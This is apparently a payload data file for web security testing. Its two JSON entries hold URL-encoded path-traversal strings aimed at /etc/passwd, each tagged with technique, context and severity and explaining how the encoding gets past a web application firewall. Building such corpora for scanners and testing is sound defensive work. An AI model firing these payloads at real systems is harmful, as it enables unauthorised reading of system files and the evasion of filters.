{"text": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "technique": "path_traversal", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["generic"], "severity_boost": 0.85, "explanation": "URL-encoded path traversal. %2e is . and %2f is /. If the WAF inspects before URL decoding but the app decodes first, the traversal succeeds."}
{"text": "..%2f..%2f..%2fetc%2fpasswd", "technique": "path_traversal", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["generic"], "severity_boost": 0.85, "explanation": "Partially URL-encoded traversal. Only the forward slashes are encoded. Evades filters that look for ../ as a literal string."}
